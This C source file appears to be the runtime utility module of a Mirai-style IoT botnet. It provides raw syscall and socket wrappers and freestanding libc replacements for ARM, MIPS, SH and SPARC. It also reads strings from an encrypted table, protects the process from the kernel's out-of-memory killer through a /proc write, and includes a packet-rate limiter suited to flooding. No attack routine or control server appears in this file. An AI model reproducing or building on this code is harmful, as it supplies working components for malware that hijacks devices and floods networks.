#include "headers/util.h"
#include "headers/includes.h"
#include "headers/syscalls.h"
#include "../encryption/chacha20_table.h"

/* Type definitions for va_list */
typedef __builtin_va_list va_list;
#define va_start(v, l) __builtin_va_start(v, l)
#define va_end(v) __builtin_va_end(v)
#define va_arg(v, l) __builtin_va_arg(v, l)
#define NULL ((void *)0)
/* Global variable definitions */
int errno;
FILE *stdout;



uint16_t htons(uint16_t hostshort)
{
    return ((hostshort & 0xFF) << 8) | ((hostshort >> 8) & 0xFF);
}

uint16_t ntohs(uint16_t netshort)
{
    return htons(netshort);
}

void _zero(void *ptr, size_t len)
{
    memset(ptr, 0, len);
}

size_t _strlen(const char *s)
{
    return strlen(s);
}

char *strchr(const char *s, int c)
{
    while (*s)
    {
        if (*s == (char)c)
            return (char *)s;
        s++;
    }
    if ((char)c == 0)
        return (char *)s;
    return NULL;
}

void _memcpy(void *dest, const void *src, size_t n)
{
    memcpy(dest, src, n);
}

int nanosleep(const struct timespec *req, struct timespec *rem)
{
    return _syscall2(__NR_nanosleep, (long)req, (long)rem);
}

int sleep(int seconds)
{
    return _syscall1(__NR_sleep, (long)seconds);
}

int sys_poll(void *fds, nfds_t nfds, int timeout)
{
    return _syscall3(__NR_poll, (long)fds, (long)nfds, (long)timeout);
}


#undef errno
int errno;
int *__errno_location(void) { return &errno; }

#define SET_ERRNO(res)                                \
    if ((unsigned long)(res) >= (unsigned long)-4095) \
    {                                                 \
        errno = -(int)(res);                          \
        return -1;                                    \
    }                                                 \
    return (int)(res);


#if defined(__arm__) || defined(__ARM_EABI__)
unsigned int __aeabi_uidiv(unsigned int num, unsigned int den)
{
    unsigned int quot = 0, qbit = 1;
    if (den == 0)
        return 0;
    while ((den << 1) > den && (den << 1) <= num)
    {
        den <<= 1;
        qbit <<= 1;
    }
    while (qbit > 0)
    {
        if (num >= den)
        {
            num -= den;
            quot |= qbit;
        }
        den >>= 1;
        qbit >>= 1;
    }
    return quot;
}
int __aeabi_idiv(int num, int den)
{
    unsigned int n = (num < 0) ? (unsigned int)-num : (unsigned int)num;
    unsigned int d = (den < 0) ? (unsigned int)-den : (unsigned int)den;
    unsigned int q = __aeabi_uidiv(n, d);
    return ((num ^ den) < 0) ? -(int)q : (int)q;
}
/* Returns r0=quotient, r1=remainder via ULL packing */
unsigned long long __aeabi_uidivmod(unsigned int n, unsigned int d)
{
    unsigned int q = __aeabi_uidiv(n, d);
    unsigned int r = n - q * d;
    return ((unsigned long long)r << 32) | (unsigned long long)q;
}
long long __aeabi_idivmod(int n, int d)
{
    int q = __aeabi_idiv(n, d);
    int r = n - q * d;
    return ((long long)(unsigned int)r << 32) | (unsigned long long)(unsigned int)q;
}
/* 64-bit divmod: On entry r0:r1=n, r2:r3=d. On exit r0:r1=quot, r2:r3=rem.
 * We call a C helper __aeabi_uldiv_impl(n, d) -> quot,
 * then compute rem = n - quot*d via __aeabi_ulmul_sub_impl. */
unsigned long long __aeabi_uldiv_impl(unsigned long long n, unsigned long long d)
{
    if (d == 0)
        return 0;
    unsigned long long q = 0, qbit = 1;
    while ((d << 1) > d && (d << 1) <= n)
    {
        d <<= 1;
        qbit <<= 1;
    }
    while (qbit > 0)
    {
        if (n >= d)
        {
            n -= d;
            q |= qbit;
        }
        d >>= 1;
        qbit >>= 1;
    }
    return q;
}
void __attribute__((naked)) __aeabi_uldivmod(void)
{
    __asm__ __volatile__(
        "push {r4, r5, r6, r7, r8, r9, r10, lr}\n"
        "mov r4, r0\n" /* n_low */
        "mov r5, r1\n" /* n_high */
        "mov r6, r2\n" /* d_low */
        "mov r7, r3\n" /* d_high */
        "bl __aeabi_uldiv_impl\n"
        "mov r9, r0\n"  /* q_low */
        "mov r10, r1\n" /* q_high */
        "mov r0, r9\n"
        "mov r1, r10\n"
        "mov r2, r6\n"
        "mov r3, r7\n"
        "bl __muldi3\n"
        "sub r2, r4, r0\n"
        "sbc r3, r5, r1\n"
        "mov r0, r9\n"
        "mov r1, r10\n"
        "pop {r4, r5, r6, r7, r8, r9, r10, lr}\n"
        "bx lr\n");
}
#endif

/* generic arithmetic helpers */
unsigned long long __lshrdi3(unsigned long long a, int b)
{
    unsigned long long res = a;
    for (int i = 0; i < b; i++)
        res >>= 1;
    return res;
}
unsigned long long __ashldi3(unsigned long long a, int b)
{
    unsigned long long res = a;
    for (int i = 0; i < b; i++)
        res <<= 1;
    return res;
}
unsigned long long __udivdi3(unsigned long long n, unsigned long long d)
{
    if (d == 0)
        return 0;
    unsigned long long q = 0, r = 0;
    for (int i = 63; i >= 0; i--)
    {
        r = (r << 1) | ((n >> i) & 1);
        if (r >= d)
        {
            r -= d;
            q |= (1ULL << i);
        }
    }
    return q;
}
unsigned long long __umoddi3(unsigned long long n, unsigned long long d)
{
    if (d == 0)
        return 0;
    unsigned long long r = 0;
    for (int i = 63; i >= 0; i--)
    {
        r = (r << 1) | ((n >> i) & 1);
        if (r >= d)
        {
            r -= d;
        }
    }
    return r;
}
long long __divdi3(long long n, long long d)
{
    long long q = 0;
    int s = 1;
    if (n < 0)
    {
        n = -n;
        s = -s;
    }
    if (d < 0)
    {
        d = -d;
        s = -s;
    }
    q = __udivdi3((unsigned long long)n, (unsigned long long)d);
    return s > 0 ? q : -q;
}
long long __moddi3(long long n, long long d)
{
    long long r = 0;
    int s = 1;
    if (n < 0)
    {
        n = -n;
        s = -s;
    }
    if (d < 0)
    {
        d = -d;
        s = -s;
    }
    r = __umoddi3((unsigned long long)n, (unsigned long long)d);
    return s > 0 ? r : -r;
}
unsigned int __udivsi3(unsigned int n, unsigned int d)
{
    if (d == 0)
        return 0;
    unsigned int q = 0, r = 0;
    for (int i = 31; i >= 0; i--)
    {
        r = (r << 1) | ((n >> i) & 1);
        if (r >= d)
        {
            r -= d;
            q |= (1U << i);
        }
    }
    return q;
}
unsigned int __umodsi3(unsigned int n, unsigned int d)
{
    if (d == 0)
        return 0;
    unsigned int r = 0;
    for (int i = 31; i >= 0; i--)
    {
        r = (r << 1) | ((n >> i) & 1);
        if (r >= d)
        {
            r -= d;
        }
    }
    return r;
}
int __divsi3(int n, int d)
{
    int q = 0, s = 1;
    if (n < 0)
    {
        n = -n;
        s = -s;
    }
    if (d < 0)
    {
        d = -d;
        s = -s;
    }
    q = __udivsi3((unsigned int)n, (unsigned int)d);
    return s > 0 ? q : -q;
}
int __modsi3(int n, int d)
{
    int r = 0, s = 1;
    if (n < 0)
    {
        n = -n;
        s = -s;
    }
    if (d < 0)
    {
        d = -d;
        s = -s;
    }
    r = __umodsi3((unsigned int)n, (unsigned int)d);
    return s > 0 ? r : -r;
}
long long __muldi3(long long a, long long b)
{
    long long res = 0;
    unsigned long long ua = (unsigned long long)a;
    unsigned long long ub = (unsigned long long)b;
    while (ub > 0)
    {
        if (ub & 1)
            res += ua;
        ua <<= 1;
        ub >>= 1;
    }
    return res;
}

/* Syscall wrappers */
int sys_getpid(void) { return _syscall0(__NR_getpid); }
int sys_getppid(void) { return _syscall0(__NR_getppid); }
int sys_fork(void)
{
#if defined(__NR_fork)
    long res = _syscall0(__NR_fork);
#else
    long res = _syscall0(__NR_clone);
#endif
    SET_ERRNO(res);
}
void sys_exit(int s) { _syscall1(__NR_exit, s); }
int sys_open(const char *p, int f, int m)
{
    long res = _syscall3(__NR_open, (long)p, f, m);
    SET_ERRNO(res);
}
int sys_close(int f)
{
    long res = _syscall1(__NR_close, f);
    SET_ERRNO(res);
}
ssize_t sys_read(int f, void *b, size_t l)
{
    long res = _syscall3(__NR_read, f, (long)b, (long)l);
    SET_ERRNO(res);
}
int sys_write(int f, void *b, size_t l)
{
    long res = _syscall3(__NR_write, f, (long)b, (long)l);
    SET_ERRNO(res);
}
int sys_kill(int p, int s)
{
    long res = _syscall2(__NR_kill, p, s);
    SET_ERRNO(res);
}
int sys_access(const char *p, int m)
{
#if defined(__NR_access)
    long res = _syscall2(__NR_access, (long)p, m);
#else
    long res = _syscall3(__NR_faccessat, AT_FDCWD, (long)p, m);
#endif
    SET_ERRNO(res);
}
int sys_readlink(char *p, char *b, size_t l)
{
    long res = _syscall3(__NR_readlink, (long)p, (long)b, (long)l);
    SET_ERRNO(res);
}
int sys_stat(const char *p, struct stat *b)
{
#if defined(__NR_stat64)
    long res = _syscall2(__NR_stat64, (long)p, (long)b);
#elif defined(__NR_fstatat64)
    long res = _syscall4(__NR_fstatat64, AT_FDCWD, (long)p, (long)b, 0);
#elif defined(__NR_newstat)
    long res = _syscall2(__NR_newstat, (long)p, (long)b);
#elif defined(__NR_stat)
    long res = _syscall2(__NR_stat, (long)p, (long)b);
#else
#error "No stat syscall defined"
#endif
    SET_ERRNO(res);
}
int sys_fcntl(int f, int c, long a)
{
    long res = _syscall3(__NR_fcntl, f, c, a);
    SET_ERRNO(res);
}
int sys_chdir(const char *p)
{
    long res = _syscall1(__NR_chdir, (long)p);
    SET_ERRNO(res);
}
int sys_execve(const char *f, char **a, char **e)
{
    long res = _syscall3(__NR_execve, (long)f, (long)a, (long)e);
    SET_ERRNO(res);
}
int sys_setsid(void)
{
    long res = _syscall0(__NR_setsid);
    SET_ERRNO(res);
}

int sys_select(int n, fd_set *r, fd_set *w, fd_set *e, struct timeval *t)
{
#if defined(__NR_select)
    long res = _syscall5(__NR_select, n, (long)r, (long)w, (long)e, (long)t);
    if (res != -89)
    {
        SET_ERRNO(res);
        return (int)res;
    }
#endif
#if defined(__NR__newselect)
    long res2 = _syscall5(__NR__newselect, n, (long)r, (long)w, (long)e, (long)t);
    if (res2 != -89)
    {
        SET_ERRNO(res2);
        return (int)res2;
    }
#endif

    /* Fallback to poll for MIPS if select is ENOSYS */
    struct pollfd fds[1];
    fds[0].fd = n - 1;
    fds[0].events = 0;

    if (r && FD_ISSET(n - 1, r))
        fds[0].events |= POLLIN;
    if (w && FD_ISSET(n - 1, w))
        fds[0].events |= POLLOUT;
    if (fds[0].events == 0)
        return 0;

    int p_ret = sys_poll(fds, 1, (t ? (t->tv_sec * 1000 + t->tv_usec / 1000) : -1));
    if (p_ret > 0)
    {
        if (r)
            FD_ZERO(r);
        if (w)
            FD_ZERO(w);
        if (e)
            FD_ZERO(e);
        if ((fds[0].revents & POLLIN) && r)
            FD_SET(fds[0].fd, r);
        if ((fds[0].revents & POLLOUT) && w)
            FD_SET(fds[0].fd, w);
    }
    return p_ret;
}
int sys_ioctl(int f, int r, void *a)
{
    long res = _syscall3(__NR_ioctl, f, r, (long)a);
    SET_ERRNO(res);
}
int sys_mount(char *s, char *t, char *f, unsigned long m, void *d)
{
    long res = _syscall5(__NR_mount, (long)s, (long)t, (long)f, m, (long)d);
    SET_ERRNO(res);
}
int sys_getdents64(int f, void *d, int c)
{
    long res = _syscall3(__NR_getdents64, f, (long)d, c);
    SET_ERRNO(res);
}
int sys_prctl(int o, ...)
{
    __builtin_va_list a;
    __builtin_va_start(a, o);
    unsigned long a2 = __builtin_va_arg(a, unsigned long), a3 = __builtin_va_arg(a, unsigned long), a4 = __builtin_va_arg(a, unsigned long), a5 = __builtin_va_arg(a, unsigned long);
    __builtin_va_end(a);
    return _syscall5(__NR_prctl, o, a2, a3, a4, a5);
}
int sys_sysinfo(struct sysinfo *i) { return _syscall1(__NR_sysinfo, (long)i); }
long sys_sysconf(int n) { return 1; }
int sys_sched_setscheduler(int p, int l, const struct sched_param *r) { return _syscall3(__NR_sched_setscheduler, p, l, (long)r); }
int sys_setpriority(int w, int h, int p) { return _syscall3(__NR_setpriority, w, h, p); }
int sys_getrlimit(int r, struct rlimit *l)
{
#if defined(__NR_getrlimit)
    return _syscall2(__NR_getrlimit, r, (long)l);
#else
    return _syscall2(__NR_ugetrlimit, r, (long)l);
#endif
}
int sys_setrlimit(int r, const struct rlimit *l) { return _syscall2(__NR_setrlimit, r, (long)l); }
int sys_unlink(const char *p) { return _syscall1(__NR_unlink, (long)p); }
unsigned int sys_alarm(unsigned int s) { return _syscall1(__NR_alarm, s); }

int sys_usleep(unsigned int usec)
{
    struct timespec ts;
    ts.tv_sec = usec / 1000000;
    ts.tv_nsec = (usec % 1000000) * 1000;
    return nanosleep((const struct timespec *)&ts, NULL);
}

int sys_sleep(int seconds)
{
    return sleep(seconds);
}

void sys_signal(int s, void (*f)(int))
{
#if defined(__mips__) || defined(__mips)
    struct
    {
        unsigned int sa_flags;
        void (*sa_handler)(int);
        unsigned long sa_mask[4]; // 128 bits = 16 bytes
    } sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = f;
    sa.sa_flags = 0x10000000; // SA_RESTART
    _syscall4(__NR_rt_sigaction, s, (long)&sa, 0, 16);
#else
    struct
    {
        void (*sa_handler)(int);
        unsigned long sa_flags;
        void (*sa_restorer)(void);
        unsigned long sa_mask;
    } sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = f;
    sa.sa_flags = 0x10000000; // SA_RESTART
    _syscall4(__NR_rt_sigaction, s, (long)&sa, 0, 8);
#endif
    return;
}
int sys_gettimeofday(struct timeval *t, void *z) { return _syscall2(__NR_gettimeofday, (long)t, (long)z); }
int sys_clock_gettime(int i, struct timespec *t) { return _syscall2(__NR_clock_gettime, i, (long)t); }
time_t sys_time(time_t *t)
{
#if defined(__NR_time)
    long n = _syscall1(__NR_time, (long)t);
    return n;
#else
    struct timeval tv;
    sys_gettimeofday(&tv, 0);
    if (t)
        *t = tv.tv_sec;
    return tv.tv_sec;
#endif
}

/* Network calls */
int sys_socket(int d, int t, int p)
{
    long res;
#if defined(__i386__)
    long args[3] = {d, t, p};
    res = _syscall2(__NR_socketcall, 1, (long)args);
#else
    res = _syscall3(__NR_socket, d, t, p);
#endif
    SET_ERRNO(res);
}
int sys_bind(int f, void *a, socklen_t l)
{
    long res;
#if defined(__i386__)
    long args[3] = {f, (long)a, l};
    res = _syscall2(__NR_socketcall, 2, (long)args);
#else
    res = _syscall3(__NR_bind, f, (long)a, l);
#endif
    SET_ERRNO(res);
}
int sys_connect(int f, void *a, socklen_t l)
{
    long res;
#if defined(__i386__)
    long args[3] = {f, (long)a, l};
    res = _syscall2(__NR_socketcall, 3, (long)args);
#else
    res = _syscall3(__NR_connect, f, (long)a, l);
#endif
    SET_ERRNO(res);
}
int sys_listen(int f, int b)
{
    long res;
#if defined(__i386__)
    long args[2] = {f, b};
    res = _syscall2(__NR_socketcall, 4, (long)args);
#else
    res = _syscall2(__NR_listen, f, b);
#endif
    SET_ERRNO(res);
}
int sys_accept(int f, void *a, socklen_t *l)
{
    long res;
#if defined(__i386__)
    long args[3] = {f, (long)a, (long)l};
    res = _syscall2(__NR_socketcall, 5, (long)args);
#else
    res = _syscall3(__NR_accept, f, (long)a, (long)l);
#endif
    SET_ERRNO(res);
}
int sys_getsockname(int f, void *a, socklen_t *l)
{
    long res;
#if defined(__i386__)
    long args[3] = {f, (long)a, (long)l};
    res = _syscall2(__NR_socketcall, 6, (long)args);
#else
    res = _syscall3(__NR_getsockname, f, (long)a, (long)l);
#endif
    SET_ERRNO(res);
}
int sys_getpeername(int f, void *a, socklen_t *l)
{
    long res;
#if defined(__i386__)
    long args[3] = {f, (long)a, (long)l};
    res = _syscall2(__NR_socketcall, 7, (long)args);
#else
    res = _syscall3(__NR_getpeername, f, (long)a, (long)l);
#endif
    SET_ERRNO(res);
}
int sys_sendto_impl(int f, void *b, size_t l, int fl, void *a, socklen_t al)
{
    long res;
#if defined(__i386__)
    long args[6] = {f, (long)b, l, fl, (long)a, al};
    res = _syscall2(102 /*socketcall*/, 11, (long)args);
#else
    res = _syscall6(__NR_sendto, f, (long)b, l, fl, (long)a, al);
#endif
    SET_ERRNO(res);
}
int sys_send(int f, void *b, size_t l, int fl)
{
    long res;
#if defined(__i386__)
    long args[4] = {f, (long)b, l, fl};
    res = _syscall2(102 /*socketcall*/, 9, (long)args);
#elif defined(__NR_send)
    res = _syscall4(__NR_send, f, (long)b, l, fl);
#else
    res = _syscall6(__NR_sendto, f, (long)b, l, fl, 0, 0);
#endif
    SET_ERRNO(res);
}
int sys_recvfrom(int f, void *b, size_t l, int fl, void *a, socklen_t *al)
{
    long res;
#if defined(__i386__)
    long args[6] = {f, (long)b, l, fl, (long)a, (long)al};
    res = _syscall2(102 /*socketcall*/, 12, (long)args);
#else
    res = _syscall6(__NR_recvfrom, f, (long)b, l, fl, (long)a, (long)al);
#endif
    SET_ERRNO(res);
}
int sys_recv(int f, void *b, size_t l, int fl)
{
    long res;
#if defined(__i386__)
    long args[4] = {f, (long)b, l, fl};
    res = _syscall2(102 /*socketcall*/, 10, (long)args);
#elif defined(__NR_recv)
    res = _syscall4(__NR_recv, f, (long)b, l, fl);
#else
    res = _syscall6(__NR_recvfrom, f, (long)b, l, fl, 0, 0);
#endif
    SET_ERRNO(res);
}
int sys_setsockopt_impl(int f, int l, int n, void *v, socklen_t o)
{
    long res;
#if defined(__i386__)
    long args[5] = {f, l, n, (long)v, o};
    res = _syscall2(__NR_socketcall, 14, (long)args);
#else
    res = _syscall5(__NR_setsockopt, f, l, n, (long)v, o);
#endif
    SET_ERRNO(res);
}
int sys_getsockopt(int f, int l, int n, void *v, socklen_t *o)
{
    long res;
#if defined(__i386__)
    long args[5] = {f, l, n, (long)v, (long)o};
    res = _syscall2(__NR_socketcall, 15, (long)args);
#else
    res = _syscall5(__NR_getsockopt, f, l, n, (long)v, (long)o);
#endif
    SET_ERRNO(res);
}

void set_oom_protection(void)
{
    int fd = sys_open(enc[PROC_OOM_ADJ].string, 1 | 0x40 | 0x200, 0);
    if (fd >= 0)
    {
        sys_write(fd, enc[OOM_SCORE_STR].string, 5);
        sys_close(fd);
    }
}

/* Memory/String utilities */
void *memcpy(void *dst, const void *src, size_t len)
{
    char *d = dst;
    const char *s = src;
    while (len--)
        *d++ = *s++;
    return dst;
}
void *memset(void *buf, int set, size_t len)
{
    char *p = buf;
    while (len--)
        *p++ = (char)set;
    return buf;
}
int memcmp(const void *s1, const void *s2, size_t n)
{
    const unsigned char *p1 = s1, *p2 = s2;
    while (n--)
        if (*p1 != *p2)
            return *p1 - *p2;
        else
            p1++, p2++;
    return 0;
}
size_t strlen(const char *str)
{
    size_t c = 0;
    while (*str++)
        c++;
    return c;
}
int strcmp(const char *s1, const char *s2)
{
    while (*s1 && *s1 == *s2)
    {
        s1++;
        s2++;
    }
    return (unsigned char)*s1 - (unsigned char)*s2;
}
int strncmp(const char *s1, const char *s2, size_t n)
{
    if (n == 0)
        return 0;
    while (n-- > 1 && *s1 && *s1 == *s2)
    {
        s1++;
        s2++;
    }
    return (unsigned char)*s1 - (unsigned char)*s2;
}
char *strcpy(char *dst, const char *src)
{
    char *r = dst;
    while ((*dst++ = *src++))
        ;
    return r;
}
char *strcat(char *dst, const char *src)
{
    char *r = dst;
    while (*dst)
        dst++;
    while ((*dst++ = *src++))
        ;
    return r;
}
char *sys_strstr(const char *h, const char *n)
{
    size_t nl = strlen(n);
    if (!nl)
        return (char *)h;
    while (*h)
    {
        if (!memcmp(h, n, nl))
            return (char *)h;
        h++;
    }
    return NULL;
}
int isdigit(int c) { return (c >= '0' && c <= '9'); }


void *malloc(size_t len)
{
    size_t total = len + sizeof(size_t);
#ifdef __NR_mmap2
    long p = _syscall6(__NR_mmap2, 0, total, 3, SYS_MAP_PRIVATE | SYS_MAP_ANON, -1, 0);
#else
    long p = _syscall6(__NR_mmap, 0, total, 3, SYS_MAP_PRIVATE | SYS_MAP_ANON, -1, 0);
#endif
    if (p < 0 && p > -4096)
        return NULL;
    *(size_t *)p = total;
    return (void *)((size_t *)p + 1);
}
void *realloc(void *ptr, size_t len)
{
    if (!ptr)
        return malloc(len);
    size_t old_total = *((size_t *)ptr - 1);
    void *new_ptr = malloc(len);
    if (new_ptr)
    {
        memcpy(new_ptr, ptr, old_total - sizeof(size_t) < len ? old_total - sizeof(size_t) : len);
        free(ptr);
    }
    return new_ptr;
}
void *calloc(size_t n, size_t s)
{
    size_t t = n * s;
    void *p = malloc(t);
    if (p)
        memset(p, 0, t);
    return p;
}
void free(void *ptr)
{
    if (ptr)
    {
        size_t *p = (size_t *)ptr - 1;
        _syscall2(__NR_munmap, (long)p, *p);
    }
}

/* RNG */
static uint32_t seed = 0x12345678;
void srand(unsigned int s) { seed = s; }
int rand(void)
{
    seed = seed * 1103515245 + 12345;
    return (seed / 65536) % 32768;
}
clock_t clock(void)
{
    struct timespec ts;
    sys_clock_gettime(1, &ts);
    return (clock_t)(ts.tv_sec * 1000 + ts.tv_nsec / 1000000);
}

uint32_t inet_addr(const char *cp)
{
    uint32_t a[4];
    int i = 0;
    while (*cp && i < 4)
    {
        a[i] = 0;
        while (*cp >= '0' && *cp <= '9')
            a[i] = a[i] * 10 + (*cp++ - '0');
        if (*cp == '.')
            cp++;
        i++;
    }
    uint32_t res = (a[0] << 24) | (a[1] << 16) | (a[2] << 8) | a[3];
    return htonl(res);
}
char *inet_ntoa(struct in_addr in)
{
    static char buf[16];
    unsigned char *p = (unsigned char *)&in.s_addr;
    sprintf(buf, enc[FMT_IP].string, p[0], p[1], p[2], p[3]);
    return buf;
}

void pps_limit_init(struct pps_limiter *limiter, uint32_t min_pps, uint32_t max_pps)
{
    if (limiter)
    {
        limiter->pps_target = min_pps;
        limiter->packets_sent = 0;
        limiter->last_sec = 0;
    }
}
void pps_limit_wait(struct pps_limiter *limiter, uint32_t min_pps, uint32_t max_pps) { sys_usleep(1000); }

DIR *sys_opendir(const char *name)
{
    int fd = sys_open((char *)name, 0x00200000 | 0, 0);
    if (fd == -1)
        return NULL;
    DIR *dir = malloc(sizeof(DIR));
    if (!dir)
    {
        sys_close(fd);
        return NULL;
    }
    dir->fd = fd;
    dir->buf_pos = 0;
    dir->buf_end = 0;
    return dir;
}
struct dirent *sys_readdir(DIR *dirp)
{
    if (dirp->buf_pos >= dirp->buf_end)
    {
        int n = sys_getdents64(dirp->fd, dirp->buf, sizeof(dirp->buf));
        if (n <= 0)
            return NULL;
        dirp->buf_end = n;
        dirp->buf_pos = 0;
    }
    struct linux_dirent64
    {
        uint64_t d_ino;
        int64_t d_off;
        unsigned short d_reclen;
        unsigned char d_type;
        char d_name[];
    } *de;
    de = (struct linux_dirent64 *)(dirp->buf + dirp->buf_pos);
    static struct dirent res;
    res.d_ino = de->d_ino;
    res.d_off = de->d_off;
    res.d_reclen = de->d_reclen;
    memcpy(res.d_name, de->d_name, de->d_reclen - (size_t)((char *)de->d_name - (char *)de));
    dirp->buf_pos += de->d_reclen;
    return &res;
}
int sys_closedir(DIR *dirp)
{
    if (dirp)
    {
        sys_close(dirp->fd);
        free(dirp);
    }
    return 0;
}

char *hex_to_text(char *hex) { return hex; }
uint32_t _local_addr(void)
{
    int fd = sys_socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0)
    {
        debug("[local_addr] socket failed: %d\n", fd);
        return 0;
    }
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
#if __BYTE_ORDER__ == __ORDER_LITTLE_ENDIAN__
    a.sin_family = 2;    // AF_INET
    a.sin_port = 0x3500; // 53 in Network Byte Order (Big Endian)
#else
    a.sin_family = 2;
    a.sin_port = 53;
#endif
    a.sin_addr.s_addr = 0x08080808;
    debug("[local_addr] connecting...\n");
    if (sys_connect(fd, (struct sockaddr *)&a, sizeof(a)) < 0)
    {
        debug("[local_addr] connect failed\n");
        sys_close(fd);
        return 0;
    }
    debug("[local_addr] getsockname...\n");
    struct sockaddr_in local;
    socklen_t len = sizeof(local);
    sys_getsockname(fd, (struct sockaddr *)&local, &len);
    sys_close(fd);
    debug("[local_addr] done\n");
    return local.sin_addr.s_addr;
}

#if defined(__sh__)
int __sdivsi3_i4(int n, int d)
{
    if (d == 0)
        return 0;
    return n / d;
}
unsigned int __udivsi3_i4(unsigned int n, unsigned int d)
{
    if (d == 0)
        return 0;
    return n / d;
}
#endif

#if defined(__sparc__) || defined(__sparc)
/* SPARC 32-bit math helpers using assembly labels to define symbols starting with a dot */
long __sparc_mul(long a, long b) __asm__(".mul");
long __sparc_mul(long a, long b) { return a * b; }
unsigned long __sparc_umul(unsigned long a, unsigned long b) __asm__(".umul");
unsigned long __sparc_umul(unsigned long a, unsigned long b) { return a * b; }
long __sparc_div(long a, long b) __asm__(".div");
long __sparc_div(long a, long b)
{
    if (b == 0)
        return 0;
    return a / b;
}
unsigned long __sparc_udiv(unsigned long a, unsigned long b) __asm__(".udiv");
unsigned long __sparc_udiv(unsigned long a, unsigned long b)
{
    if (b == 0)
        return 0;
    return a / b;
}
long __sparc_rem(long a, long b) __asm__(".rem");
long __sparc_rem(long a, long b)
{
    if (b == 0)
        return 0;
    return a % b;
}
unsigned long __sparc_urem(unsigned long a, unsigned long b) __asm__(".urem");
unsigned long __sparc_urem(unsigned long a, unsigned long b)
{
    if (b == 0)
        return 0;
    return a % b;
}
#endif
